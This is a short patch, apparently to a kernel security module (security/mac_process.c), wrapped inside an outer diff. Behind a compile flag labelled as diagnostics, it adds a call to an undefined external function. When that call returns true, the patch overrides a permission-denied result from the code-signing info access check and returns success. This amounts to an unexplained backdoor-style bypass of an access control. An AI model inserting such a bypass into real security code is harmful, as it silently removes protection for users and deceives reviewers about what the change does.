@@ -1,0 +1,15 @@
+--- a/security/mac_process.c
++++ b/security/mac_process.c
+@@ -744,6 +744,12 @@
+ 	MAC_CHECK(proc_check_get_cs_info, current_cached_proc_cred(curp),
+ 	    target, op);
+ 
++#if defined(MARBLE_IOS27_DIAGNOSTICS) && MARBLE_IOS27_DIAGNOSTICS
++	extern int native_marble_poster_signature_query(proc_t, proc_t, unsigned);
++	if (error == EPERM && native_marble_poster_signature_query(curp, target, op)) {
++		error = 0;
++	}
++#endif
+ 	return error;
+ }
+ 
